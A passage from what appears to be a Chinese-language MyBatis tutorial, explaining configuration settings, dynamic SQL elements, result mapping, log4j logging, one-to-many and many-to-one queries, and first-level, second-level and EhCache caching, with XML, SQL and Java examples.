&lt;mappers&gt; &lt;mapper resource=&quot;mapper/UserMapper.xml&quot;/&gt; &lt;/mappers&gt;&lt;/configuration&gt; 设定别名 详见别名 其他配置浏览 settings能对我的一些核心功能进行配置，如懒加载、日志实现、缓存开启关闭等 简单参数说明： 点击查看 设置参数描述有效值默认值cacheEnabled该配置影响的所有映射 器中配置的缓存的全局 开关。true | falsetruelazyLoadingEnabled延迟加载的全局开关。 当开启时，所有关联对 象都会延迟加载。特定 关联关系中可通过设置 fetchType属性来覆盖该 项的开关状态。true | falsefalseuseColumnLabel使用列标签代替列名。 不同的驱动在这方面会 有不同的表现，具体可 参考相关驱动文档或通 过测试这两种不同的模 式来观察所用驱动的结 果。true | falsetrueuseGeneratedKeys允许 JDBC 支持自动生 成主键，需要驱动兼 容。如果设置为 true 则 这个设置强制使用自动 生成主键，尽管一些驱 动不能兼容但仍可正常 工作（比如 Derby）。true | falseFalsedefaultStatementTimeout设置超时时间，它决定 驱动等待数据库响应的 秒数。Any positive integer Not SNot Set (null)mapUnderscoreToCamelCase是否开启自动驼峰命名 规则（camel case）映 射，即从经典数据库列 名 A_COLUMN 到经典 Java 属性名 aColumn 的类似映射。true | falseFalselogPrefix指定 MyBatis 增加到日 志名称的前缀。Any StringNot setlogImpl指定 MyBatis 所用日志 的具体实现，未指定时 将自动查找。SLF4J | LOG4J | LOG4J2 | JDK_LOGGING | COMMONS_LOGGING | STDOUT_LOGGING | NO_LOGGINGNot set123456789101112131415161718192021&lt;settings&gt; &lt;!----&gt; &lt;setting name=&quot;cacheEnabled&quot; value=&quot;true&quot;/&gt; &lt;!----&gt; &lt;setting name=&quot;lazyLoadingEnabled&quot; value=&quot;true&quot;/&gt; &lt;!----&gt; &lt;setting name=&quot;multipleResultSetsEnabled&quot; value=&quot;true&quot;/&gt; &lt;setting name=&quot;useColumnLabel&quot; value=&quot;true&quot;/&gt; &lt;setting name=&quot;useGeneratedKeys&quot; value=&quot;false&quot;/&gt; &lt;setting name=&quot;autoMappingBehavior&quot; value=&quot;PARTIAL&quot;/&gt; &lt;setting name=&quot;autoMappingUnknownColumnBehavior&quot; value=&quot;WARNING&quot;/&gt; &lt;setting name=&quot;defaultExecutorType&quot; value=&quot;SIMPLE&quot;/&gt; &lt;setting name=&quot;defaultStatementTimeout&quot; value=&quot;25&quot;/&gt; &lt;setting name=&quot;defaultFetchSize&quot; value=&quot;100&quot;/&gt; &lt;setting name=&quot;safeRowBoundsEnabled&quot; value=&quot;false&quot;/&gt; &lt;setting name=&quot;mapUnderscoreToCamelCase&quot; value=&quot;false&quot;/&gt; &lt;setting name=&quot;localCacheScope&quot; value=&quot;SESSION&quot;/&gt; &lt;setting name=&quot;jdbcTypeForNull&quot; value=&quot;OTHER&quot;/&gt; &lt;setting name=&quot;lazyLoadTriggerMethods&quot; value=&quot;equals,clone,hashCode,toString&quot;/&gt;&lt;/settings&gt; 动态sql 概述 MyBatis提供了对SQL语句动态的组装能力，大量的判断都可以在 MyBatis的映射XML文件里面配置，以达到许多我们需要大量代码才能实现的功能，大大减少了我们编写代码的工作量。 动态SQL的元素 动态SQL中的元素 元素 作用 备注 if 判断语句 但条件分支判断 choose、when、otherwise 相当于java中的case when语句 多条件分支判断 trim、where、set 辅助元素 用于处理一些SQL拼装问题 foreach 循环语句 在in语句等列举调价常用 if元素（常用） if元素相当于Java中的if语句，它常常与test属性联合使用。现在我们要根据username去查询用户，但是username是可选的，如下所示： 1234567891011121314&lt;select id=&quot;findUserById&quot; resultType=&quot;com.ender.entity.User&quot;&gt; select id,username,password from user where 1 =1 &lt;if test=&quot;id != null and id != &#x27;&#x27;&quot;&gt; AND id = #&#123;id&#125; &lt;/if&gt; &lt;if test=&quot;username != null and username != &#x27;&#x27;&quot;&gt; AND username = #&#123;username&#125; &lt;/if&gt; &lt;if test=&quot;password != null and password != &#x27;&#x27;&quot;&gt; AND password = #&#123;password&#125; &lt;/if&gt;&lt;/select&gt; choose、when、otherwise元素 有些时候我们还需要多种条件的选择，在Java中我们可以使用switch、case、default语句，而在映射器 的动态语句中可以使用choose、when、otherwise元素 12345678910111213&lt;!-- 有name的时候使用name搜索，没有的时候使用id搜索 --&gt;&lt;select id=&quot;select&quot; resultType=&quot;com.ender.entity.User&quot;&gt; SELECT * FROM user WHERE 1=1 &lt;choose&gt; &lt;when test=&quot;name != null and name != &#x27;&#x27;&quot;&gt; AND username LIKE concat(&#x27;%&#x27;, #&#123;username&#125;, &#x27;%&#x27;) &lt;/when&gt; &lt;when test=&quot;id != null&quot;&gt; AND id = #&#123;id&#125; &lt;/when&gt; &lt;/choose&gt;&lt;/select&gt; where元素 上面的select语句我们加了一个 1=1 的绝对true的语句，目的是为了防止语句错误，变成 SELECT * FROM student WHERE 这样where后没有内容的错误语句。这样会有点奇怪，此时可以使用where元素。 123456789101112131415&lt;select id=&quot;findUserById&quot; resultType=&quot;com.xinzhi.entity.User&quot;&gt; select id,username,password from user &lt;where&gt; &lt;if test=&quot;id != null and id != &#x27;&#x27;&quot;&gt; AND id = #&#123;id&#125; &lt;/if&gt; &lt;if test=&quot;username != null and username != &#x27;&#x27;&quot;&gt; AND username = #&#123;username&#125; &lt;/if&gt; &lt;if test=&quot;password != null and password != &#x27;&#x27;&quot;&gt; AND password = #&#123;password&#125; &lt;/if&gt; &lt;/where&gt;&lt;/select&gt; trim元素 有时候我们要去掉一些特殊的SQL语法，比如常见的and、or，此时可以使用trim元素。trim元素意味着 我们需要去掉一些特殊的字符串，prefix代表的是语句的前缀，而prefixOverrides代表的是你需要去掉 的那种字符串，suffix表示语句的后缀，suffixOverrides代表去掉的后缀字符串。 12345678910111213141516171819202122&lt;insert id=&quot;saveUser&quot; parameterType=&quot;com.ender.entity.User&quot;&gt; insert into user ( &lt;trim suffixOverrides=&quot;,&quot;&gt; &lt;if test=&quot;username != null and username != &#x27;&#x27;&quot;&gt; username, &lt;/if&gt; &lt;if test=&quot;password != null and password != &#x27;&#x27;&quot;&gt; password, &lt;/if&gt; &lt;/trim&gt; )value( &lt;trim suffixOverrides=&quot;,&quot;&gt; &lt;if test=&quot;username != null and username != &#x27;&#x27;&quot;&gt; #&#123;username&#125;, &lt;/if&gt; &lt;if test=&quot;password != null and password != &#x27;&#x27;&quot;&gt; #&#123;password&#125;, &lt;/if&gt; &lt;/trim&gt; )&lt;/insert&gt; set元素 在update语句中，如果我们只想更新某几个字段的值，这个时候可以使用set元素配合if元素来完成。注 意：set元素遇到,会自动把,去掉。 123456789101112&lt;update id=&quot;updateUser&quot; parameterType=&quot;com.ender.entity.User&quot;&gt; update user &lt;set&gt; &lt;if test = &quot;username != null and username != &#x27;&#x27;&quot;&gt; username = #&#123;username&#125; &lt;/if&gt; &lt;if test=&quot;password != null and password != &#x27;&#x27;&quot;&gt; password = #&#123;password&#125; &lt;/if&gt; &lt;/set&gt; where id = #&#123;id&#125;&lt;/update&gt; foreach元素 foreach元素是一个循环语句，它的作用是遍历集合，可以支持数组、List、Set接口。 1234567&lt;select id=&quot;select&quot; resultType=&quot;com.xinzhi.entity.User&quot;&gt; SELECT * FROM user WHERE id IN &lt;foreach collection=&quot;ids&quot; open=&quot;(&quot; close=&quot;)&quot; separator=&quot;,&quot; item=&quot;id&quot;&gt; #&#123;id&#125; &lt;/foreach&gt;&lt;/select&gt; collection配置的是传递进来的参数名称 item配置的是循环中当前的元素。 index配置的是当前元素在集合的位置下标。 open和 close配置的是以什么符号将这些集合元素包装起来。 separator是各个元素的间隔符。 SQL片段 有时候可能某个 sql 语句我们用的特别多，为了增加代码的重用性，简化代码，我们需要将这些代码抽 取出来，然后使用时直接调用。 123&lt;sql id=&quot;user-all-content&quot;&gt; select id,username,password from user&lt;/sql&gt; 引用 1&lt;include refid=&quot;user-all-content&quot;/&gt; 结果映射resultMap 数据库不可能永远是你所想或所需的那个样子 属性名和字段名不一致，我们一般都会按照约定去设计数据的，但确实阻止不了沟通不充分等问题 java中实体类的设计 12345678public class User &#123; private int id; //id private String name; //姓名，数据库为username private String password; //密码，一致 //构造 //set/get //toString()&#125; mapper类 12//根据id查询用户User selectUserById(int id); mapper映射文件 123&lt;select id=&quot;selectUserById&quot; resultType=&quot;user&quot;&gt; select * from user where id = #&#123;id&#125;&lt;/select&gt; 测试 1234567@Testpublic void testSelectUserById() &#123; UserMapper mapper = session.getMapper(UserMapper.class); User user = mapper.selectUserById(1); System.out.println(user); session.close();&#125; 结果 User{id=1,name=‘null’,password=‘123’} 查询出来发现name为空 分析 select * from user where id = #{id} 可以看做 select id,username,password from user where id = #{id} mybatis会根据这些查询的列名(会将列名转化为小写,数据库不区分大小写) , 利用反射去对应的实体类中查找相应列名的set方法设值 ，当然找不到username 解决方法 方案一 为列名指定别名，别名和java实体类的属性名一致 123&lt;select id=&quot;selectUserById&quot; resultType=&quot;User&quot;&gt; select id , username as name ,password from user where id = #&#123;id&#125;&lt;/select&gt; 方案二 使用结果集映射→\\to→ResultMap(推荐) 1234567891011&lt;resultMap id=&quot;UserMap&quot; type=&quot;User&quot;&gt; &lt;!-- id为主键 --&gt; &lt;id column=&quot;id&quot; property=&quot;id&quot;/&gt; &lt;!-- column是数据库表的列名 , property是对应实体类的属性名 --&gt; &lt;result column=&quot;username&quot; property=&quot;name&quot;/&gt; &lt;!-- id表示表中的主键，需要独立设置，result表示其他字段--&gt; &lt;result column=&quot;password&quot; property=&quot;password&quot;/&gt;&lt;/resultMap&gt;&lt;select id=&quot;selectUserById&quot; resultMap=&quot;UserMap&quot;&gt; select id , username , password from user where id = #&#123;id&#125;&lt;/select&gt; 常用映射 通常在数据库中我们会使用下划线的命名方式，而java中通常使用驼峰命名法，mybatis为我们提供了两者的自动转化 1234&lt;settings&gt; &lt;!--开启驼峰命名规则--&gt; &lt;setting name=&quot;mapUnderscoreToCamelCase&quot; value=&quot;true&quot;/&gt;&lt;/settings&gt; 日志配置 配置日志的一个重要原因是想在调试的时候能观察到sql语句的输出，能查看中间过程 标准日志实现 指定 MyBatis 应该使用哪个日志记录实现。如果此设置不存在，则会自动发现日志记录实现。 STD：standard out：输出 STDOUT_LOGGING：标准输出日志 123&lt;settings&gt; &lt;setting name=&quot;logImpl&quot; value=&quot;STDOUT_LOGGING&quot;/&gt;&lt;/settings&gt; 组合log4j完成日志功能 导入log4j 12345678910&lt;dependency&gt; &lt;groupId&gt;log4j&lt;/groupId&gt; &lt;artifactId&gt;log4j&lt;/artifactId&gt; &lt;version&gt;1.2.12&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.slf4j&lt;/groupId&gt; &lt;artifactId&gt;slf4j-nop&lt;/artifactId&gt; &lt;version&gt;1.7.30&lt;/version&gt;&lt;/dependency&gt; 配置文件编写log4j.properties 12345678910111213141516171819202122#将等级为DEBUG的日志信息输出到console和file这两个目的地，console和file的定义在下面的代码log4j.rootLogger=DEBUG,console,file#控制台输出的相关设置log4j.appender.console = org.apache.log4j.ConsoleAppenderlog4j.appender.console.Target = System.outlog4j.appender.console.Threshold=DEBUGlog4j.appender.console.layout = org.apache.log4j.PatternLayoutlog4j.appender.console.layout.ConversionPattern=[%c]-%m%n#文件输出的相关设置log4j.appender.file = org.apache.log4j.RollingFileAppenderlog4j.appender.file.File=./log/xinzhi.loglog4j.appender.file.MaxFileSize=10mblog4j.appender.file.Threshold=DEBUGlog4j.appender.file.layout=org.apache.log4j.PatternLayoutlog4j.appender.file.layout.ConversionPattern=[%p][%d&#123;yy-MM-dd&#125;][%c]%m%n#日志输出级别log4j.logger.org.mybatis=DEBUGlog4j.logger.java.sql=DEBUGlog4j.logger.java.sql.Statement=DEBUGlog4j.logger.java.sql.ResultSet=DEBUGlog4j.logger.java.sql.PreparedStatement=DEBUG setting设置日志实现 123&lt;settings&gt; &lt;setting name=&quot;logImpl&quot; value=&quot;LOG4J&quot;/&gt;&lt;/settings&gt; 在程序中使用Log4j进行输出 12345678@Testpublic void findAllUsers() &#123; UserMapper mapper = session.getMapper(UserMapper.class); List&lt;User&gt; users = mapper.selectUser(); for (User user: users)&#123; System.out.println(user); &#125;&#125; 多表查询 数据库设计 部门和员工的关系为：一个部门多个员工，一个员工属于一个部门 依次我们可以实际一个一对多的数据库 123456789101112131415161718CREATE TABLE `dept` (`id` INT(10) NOT NULL,`name` VARCHAR(30) DEFAULT NULL,PRIMARY KEY (`id`));INSERT INTO dept VALUES (1, &#x27;ender开发六部&#x27;);CREATE TABLE `employee` (`id` INT(10) NOT NULL,`name` VARCHAR(30) DEFAULT NULL,`did` INT(10) DEFAULT NULL,PRIMARY KEY (`id`),CONSTRAINT `fk_did` FOREIGN KEY (`did`) REFERENCES `dept` (`id`));INSERT INTO employee VALUES (1, &#x27;小兰&#x27;, 1);INSERT INTO employee VALUES (2, &#x27;小红&#x27;, 1);INSERT INTO employee VALUES (3, &#x27;小白&#x27;, 1);INSERT INTO employee VALUES (4, &#x27;小黑&#x27;, 1);INSERT INTO employee VALUES (5, &#x27;小黄&#x27;, 1); 在多的一方维护关系 方法一：结果集嵌套 编写实体类 123456789101112131415161718192021222324/** * @author Ender-PC * @date 2021/2/6 */@Datapublic class Dept implements Serializable &#123; private int id; private String name;&#125;/** * @author Ender-PC * @date 2021/2/6 */@Datapublic class Employee implements Serializable &#123; private int id; private String name; /** * 外键Dept，维护关系 */ private Dept dept;&#125; 编写实体类对应的Mapper接口 1234public interface DeptMapper &#123;&#125;public interface EmployeeMapper &#123;&#125; 编写mapper.xml 1234567891011121314&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE mapper PUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot; &quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt;&lt;mapper namespace=&quot;com.ender.mapper.EmployeeMapper&quot;&gt;&lt;/mapper&gt;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE mapper PUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot; &quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt;&lt;mapper namespace=&quot;com.ender.mapper.DeptMapper&quot;&gt;&lt;/mapper&gt; 编写方法 123456/** * 按id获取指定员工信息 * @param id * @return employee */Employee findEmployeesById(Integer id); mapper处理 1234567891011121314151617181920212223&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE mapper PUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot; &quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt;&lt;mapper namespace=&quot;com.ender.mapper.EmployeeMapper&quot;&gt; &lt;resultMap id=&quot;EmployeeDept&quot; type=&quot;com.ender.entity.Employee&quot;&gt; &lt;!--起别名后需要设置映射关系--&gt; &lt;id property=&quot;id&quot; column=&quot;eid&quot; /&gt; &lt;result property=&quot;name&quot; column=&quot;ename&quot; /&gt; &lt;!--指定包含类的映射关系--&gt; &lt;association property=&quot;dept&quot; javaType=&quot;com.ender.entity.Dept&quot;&gt; &lt;id property=&quot;id&quot; column=&quot;did&quot; /&gt; &lt;result property=&quot;name&quot; column=&quot;dname&quot; /&gt; &lt;/association&gt; &lt;/resultMap&gt; &lt;select id=&quot;findEmployeesById&quot; parameterType=&quot;int&quot; resultMap=&quot;EmployeeDept&quot;&gt; SELECT e.id eid, e.name ename,d.id did,d.name dname FROM employee e LEFT JOIN dept d on e.did = d.id where e.id = #&#123;id&#125; &lt;/select&gt;&lt;/mapper&gt; 注册Mapper 12&lt;mapper resource=&quot;mappers/DeptMapper.xml&quot; /&gt;&lt;mapper resource=&quot;mappers/employeeMapper.xml&quot; /&gt; 测试 123456@Testpublic void testFindEmployessById()&#123; EmployeeMapper mapper = session.getMapper(EmployeeMapper.class); Employee employee = mapper.findEmployeesById(1); System.out.println(employee);&#125; 方法二：查询嵌套 编写mapper.xml employeeMapper.xml 1234567891011121314&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE mapper PUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot; &quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt;&lt;mapper namespace=&quot;com.ender.mapper.EmployeeMapper&quot;&gt; &lt;resultMap id=&quot;EmployeeDept&quot; type=&quot;com.ender.entity.Employee&quot;&gt; &lt;!--使用select标签将第二步的查询委托给另外的mapper--&gt; &lt;association property=&quot;dept&quot; javaType=&quot;com.ender.entity.Dept&quot; select=&quot;com.ender.mapper.DeptMapper.findDeptById&quot; column=&quot;did&quot; /&gt; &lt;/resultMap&gt; &lt;select id=&quot;findEmployeesById&quot; resultMap=&quot;EmployeeDept&quot;&gt; SELECT id,name,did FROM employee WHERE id = #&#123;id&#125; &lt;/select&gt;&lt;/mapper&gt; deptMapper.xml 12345678910111213&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE mapper PUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot; &quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt;&lt;mapper namespace=&quot;com.ender.mapper.DeptMapper&quot;&gt; &lt;!--起别名后记得定义映射关系--&gt; &lt;resultMap id=&quot;DeptResult&quot; type=&quot;com.ender.entity.Dept&quot;&gt; &lt;id property=&quot;id&quot; column=&quot;did&quot; /&gt; &lt;/resultMap&gt; &lt;select id=&quot;findDeptById&quot; resultMap=&quot;DeptResult&quot;&gt; SELECT id did,name FROM dept WHERE id = #&#123;id&#125; &lt;/select&gt;&lt;/mapper&gt; 在一的一方维护关系 即查找所有部门时，将该部门下的所有员工一并查找出来 方法一：结果集嵌套 实体类 123456789101112131415/** * @author Ender-PC * @date 2021/2/6 */@Data@AllArgsConstructor@NoArgsConstructorpublic class Dept implements Serializable &#123; private int id; private String name; /** * 该部门下的所有员工 */ List&lt;Employee&gt; employees;&#125; 方法 1234567891011/** * @author Ender-PC * @date 2021/2/6 */public interface DeptMapper &#123; /** * 查找所有部门信息 * @return deptList */ List&lt;Dept&gt; findDepts();&#125; Mapper配置 DeptMapper.xml 1234567891011121314151617181920&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE mapper PUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot; &quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt;&lt;mapper namespace=&quot;com.ender.mapper.DeptMapper&quot;&gt; &lt;resultMap id=&quot;DeptEmployees&quot; type=&quot;dept&quot;&gt; &lt;id property=&quot;id&quot; column=&quot;did&quot; /&gt; &lt;result property=&quot;name&quot; column=&quot;dname&quot; /&gt; &lt;!--一对多时使用collection标签，在映射数组类型时，需要使用ofType属性来指定类型，告知mybatis该List中的元素属于类，而JavaType用于告诉mybatis，映射参数的类型--&gt; &lt;collection property=&quot;employees&quot; ofType=&quot;employee&quot;&gt; &lt;id property=&quot;id&quot; column=&quot;eid&quot;/&gt; &lt;result property=&quot;name&quot; column=&quot;ename&quot;/&gt; &lt;/collection&gt; &lt;/resultMap&gt; &lt;select id=&quot;findDepts&quot; resultMap=&quot;DeptEmployees&quot;&gt; SELECT d.id did,d.name dname,e.id eid,e.name ename FROM dept d LEFT JOIN employee e on d.id = e.did &lt;/select&gt;&lt;/mapper&gt; 方法二：查询嵌套 Mapper配置 DeptMapper.xml 12345678910111213141516&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE mapper PUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot; &quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt;&lt;mapper namespace=&quot;com.ender.mapper.DeptMapper&quot;&gt;&lt;!-- 查询嵌套--&gt; &lt;resultMap id=&quot;deptEmpResult&quot; type=&quot;dept&quot; &gt; &lt;id property=&quot;id&quot; column=&quot;id&quot;/&gt; &lt;!--代理给Employee下的查询语句查询--&gt; &lt;collection property=&quot;employees&quot; ofType=&quot;employee&quot; column=&quot;id&quot; select=&quot;com.ender.mapper.EmployeeMapper.findEmployeesByDid&quot;/&gt; &lt;/resultMap&gt; &lt;select id=&quot;findDepts&quot; resultMap=&quot;deptEmpResult&quot;&gt; SELECT id,name FROM dept &lt;/select&gt;&lt;/mapper&gt; EmployeeMapper.xml 123456789&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE mapper PUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot; &quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt;&lt;mapper namespace=&quot;com.ender.mapper.EmployeeMapper&quot;&gt; &lt;select id=&quot;findEmployeesByDid&quot; resultType=&quot;employee&quot;&gt; SELECT id,name,did FROM employee WHERE did = #&#123;id&#125; &lt;/select&gt;&lt;/mapper&gt; Mybatis缓存 为什么需要缓存 如果缓存中有数据，就不用从数据库获取，大大提高系统性能 mybatis提供一级缓存和二级缓存 一级缓存 一级缓存是sqlsession级别的缓存 操作数据库时，需要构造sqlsession对象，在对象中有一个数据结构（HashMap）用于存储缓存数据 不同的sqlsession之间的缓存区域时互不影响的 一级缓存工作原理 第一次发起查询sql查询用户id为1的用户，先去找缓存中是否有id为1的用户，如果没有，再去数据库查询用户信息。得到用户信息，将用户信息存储到一级缓存中。 如果sqlsession执行了commit操作（插入，更新，删除），会清空sqlsession中的一级缓存，避免脏读 第二次发起查询id为1的用户，缓存中如果找到了，直接从缓存中获取用户信息 mybatis默认支持并开启一级缓存。 可以通过mybatis写入日志时是否调用了MySQL语句来判断缓存是否被调用 测试 编写接口方法 12//根据id查询用户User findUserById(@Param(&quot;id&quot;) int id); Mapper配置 123&lt;select id=&quot;findUserById&quot; resultType=&quot;com.ender.entity.User&quot;&gt;select * from user where id = #&#123;id&#125;&lt;/select&gt; 测试 12345678910@Testpublic void testFindUserById()&#123;UserMapper mapper = session.getMapper(UserMapper.class);User user1 = mapper.findUserById(1);System.out.println(user1);User user2 = mapper.findUserById(3);System.out.println(user2);User user3 = mapper.findUserById(1);System.out.println(user3);&#125; 查看日志 123456789101112[com.xinzhi.dao.UserMapper.findUserById]-==&gt; Preparing: selectid,username,password from user where id = ?[com.xinzhi.dao.UserMapper.findUserById]-==&gt; Parameters: 1(Integer)[com.xinzhi.dao.UserMapper.findUserById]-&lt;== Total: 1User&#123;id=1, username=&#x27;楠哥&#x27;, password=&#x27;123456&#x27;&#125; ----&gt;ID为1，第一次有sql[com.xinzhi.dao.UserMapper.findUserById]-==&gt; Preparing: selectid,username,password from user where id = ?[com.xinzhi.dao.UserMapper.findUserById]-==&gt; Parameters: 3(Integer)[com.xinzhi.dao.UserMapper.findUserById]-&lt;== Total: 1User&#123;id=3, username=&#x27;磊哥&#x27;, password=&#x27;987654&#x27;&#125; ----&gt;ID为3，第一次有sqlUser&#123;id=1, username=&#x27;楠哥&#x27;, password=&#x27;123456&#x27;&#125; ----&gt;ID为1，第二次无sql，走缓存 一级缓存失效 sqlSession不同 当sqlSession对象相同的时候，查询的条件不同，原因是第一次查询时候一级缓存中没有第二次查询所需要的数据 当sqlSession对象相同,两次查询之间进行了插入的操作 当sqlSession对象相同,手动清除了一级缓存中的数据 二级缓存 二级缓存时mapper级别的缓存，默认关闭 多个SQL session去操作同一个mapper的sql语句，多个sqlsession可以共用二级缓存，所得到的数据会存在二级缓存区域 二级缓存时跨sqlsession的 二级缓存相比一级缓存的范围更大（按namespace划分），多个sqlsession可以共享一个二级缓存 打开二级缓存 首先要手动开启mybatis二级缓存。 在config.xml设置二级缓存开关 ， 还要在具体的mapper.xml开启二级缓存 1234&lt;settings&gt; &lt;!--开启二级缓存--&gt; &lt;setting name=&quot;cacheEnabled&quot; value=&quot;true&quot;/&gt;&lt;/settings&gt; 12&lt;!-- 需要将映射的javabean类实现序列化 --&gt;class Student implements Serializable&#123;&#125; 12&lt;!--开启本Mapper的namespace下的二级缓存--&gt;&lt;cache eviction=&quot;LRU&quot; flushInterval=&quot;100000&quot;/&gt; cache属性的简介 eviction 回收策略（缓存满了的淘汰机制），目前MyBatis提供以下策略。 LRU（Least Recently Used）,最近最少使用的，最长时间不用的对象 FIFO（First In First Out）,先进先出，按对象进入缓存的顺序来移除他们 SOFT,软引用，移除基于垃圾回收器状态和软引用规则的对象 WEAK,弱引用，更积极的移除基于垃圾收集器状态和弱引用规则的对象。这里采用的是LRU， 移除最长时间不用的对形象 flushInterval 刷新间隔时间，单位为毫秒 这里配置的是100秒刷新，如果你不配置它，那么当SQL被执行的时候才会去刷新缓存。 size 引用数目 一个正整数，代表缓存最多可以存储多少个对象，不宜设置过大。设置过大会导致内存溢出。 这里配置的是1024个对象 readOnly 只读 意味着缓存数据只能读取而不能修改，这样设置的好处是我们可以快速读取缓存，缺点是我们没有办法修改缓存，他的默认值是false，不允许我们修改 操作过程 sqlsession1查询用户id为1的信息，查询到之后，会将查询数据存储到二级缓存中。 如果sqlsession3去执行相同mapper下sql，执行commit提交，会清空该mapper下的二级缓存区域的数据 sqlsession2查询用户id为1的信息，去缓存找是否存在缓存，如果存在直接从缓存中取数据 禁用二级缓存 在statement中可以设置useCache=false，禁用当前select语句的二级缓存，默认情况为true 12&lt;select id=&quot;getStudentById&quot; parameterType=&quot;java.lang.Integer&quot; resultType=&quot;Student&quot; useCache=&quot;false&quot;&gt; 在实际开发中，针对每次查询都需要最新的数据sql，要设置为useCache=“false” ，禁用二级缓存 flushCache标签 刷新缓存（清空缓存） 12&lt;select id=&quot;getStudentById&quot; parameterType=&quot;java.lang.Integer&quot; resultType=&quot;Student&quot; flushCache=&quot;true&quot;&gt; 一般下执行完commit操作都需要刷新缓存，flushCache=&quot;true 表示刷新缓存，可以避免脏读 脏读：当数据保存在缓存中时，使用修改操作将数据库中的数据修改，此时，缓存中的数据和数据库中的不一样，于是下次读操作若从缓存中读取，则会出现读到的数据不是正确的数据的情况 二级缓存应用场景 对于访问多的查询请求并且用户对查询结果实时性要求不高的情况下，可采用mybatis二级缓存，降低 数据库访问量，提高访问速度，如电话账单查询 根据需求设置相应的flushInterval:刷新间隔时间，比如三十分钟，24小时等。 二级缓存局限性 mybatis二级缓存对细粒度的数据级别的缓存实现不好，比如如下需求:对商品信息进行缓存，由于商品 信息查询访问量大，但是要求用户每次都能查询最新的商品信息，此时如果使用mybatis的二级缓存就 无法实现当一个商品变化时只刷新该商品的缓存信息而不刷新其它商品的信息，因为mybaits的二级缓 存区域以mapper为单位划分，当一个商品信息变化会将所有商品信息的缓存数据全部清空。解决此类 问题需要在业务层根据需求对数据有针对性缓存。 测试 12345678910111213@Testpublic void testFindUserCache() throws Exception &#123; //使用不同的mapper UserMapper mapper1 = session.getMapper(UserMapper.class); User user1 = mapper1.findUserById(1); System.out.println(user1); //提交了就会刷到二级缓存，要不还在一级缓存，一定要注意 session.commit(); UserMapper mapper2 = session.getMapper(UserMapper.class); User user2 = mapper2.findUserById(1); System.out.println(user2); System.out.println(user1 == user2);&#125; 结果 1234567891011[com.ender.dao.UserMapper.findUserById]-==&gt; Preparing: selectid,username,password from user where id = ?[com.ender.dao.UserMapper.findUserById]-==&gt; Parameters: 1(Integer)[com.ender.dao.UserMapper.findUserById]-&lt;== Total: 1User&#123;id=1, username=&#x27;ender&#x27;, password=&#x27;123456&#x27;&#125;[com.ender.dao.UserMapper.findUserById]-==&gt; Preparing: selectid,username,password from user where id = ?[com.ender.dao.UserMapper.findUserById]-==&gt; Parameters: 1(Integer)[com.ender.dao.UserMapper.findUserById]-&lt;== Total: 1User&#123;id=1, username=&#x27;ender&#x27;, password=&#x27;123456&#x27;&#125;false ----&gt;两个对象不是一个，发了两个sql，说明缓存没有起作用 可以看见两次同样的sql，却都进库进行了查询。说明二级缓存没开。 开启二级缓存 1&lt;setting name=&quot;cacheEnabled&quot; value=&quot;true&quot;/&gt; Mapper 1234567&lt;!--开启本Mapper的namespace下的二级缓存--&gt;&lt;cache eviction=&quot;LRU&quot; flushInterval=&quot;100000&quot; size=&quot;512&quot; readOnly=&quot;true&quot;&gt;&lt;/cache&gt;&lt;!--创建了一个 LRU 最少使用清除缓存，每隔 100 秒刷新，最多可以存储 512 个对象，返回的对象是只读的。--&gt; 测试 12345678[com.ender.dao.UserMapper.findUserById]-==&gt; Preparing: selectid,username,password from user where id = ?[com.ender.dao.UserMapper.findUserById]-==&gt; Parameters: 1(Integer)[com.ender.dao.UserMapper.findUserById]-&lt;== Total: 1User&#123;id=1, username=&#x27;ender&#x27;, password=&#x27;123456&#x27;&#125;[com.ender.dao.UserMapper]-Cache Hit Ratio [com.ender.dao.UserMapper]: 0.5User&#123;id=1, username=&#x27;ender&#x27;, password=&#x27;123456&#x27;&#125;true ----&gt;两个对象一样了，就发了一个sql，说明缓存起了作用 第三方缓存——EhCache充当三级缓存 我们的三方缓存组件很对，最常用的比如ehcache，Memcached、redis等，我们以比较简单的 ehcache为例。 引入依赖 123456&lt;!-- https://mvnrepository.com/artifact/org.mybatis.caches/mybatis-ehcache --&gt;&lt;dependency&gt; &lt;groupId&gt;org.mybatis.caches&lt;/groupId&gt; &lt;artifactId&gt;mybatis-ehcache&lt;/artifactId&gt; &lt;version&gt;1.2.1&lt;/version&gt;&lt;/dependency&gt; Mapper 1234&lt;mapper namespace = &quot;com.ender.entity.User&quot; &gt; &lt;cache type=&quot;org.mybatis.caches.ehcache.EhcacheCache&quot; eviction=&quot;LRU&quot; flushInterval=&quot;10000&quot; size=&quot;1024&quot; readOnly=&quot;true&quot;/&gt;&lt;/mapper&gt; ehcache配置 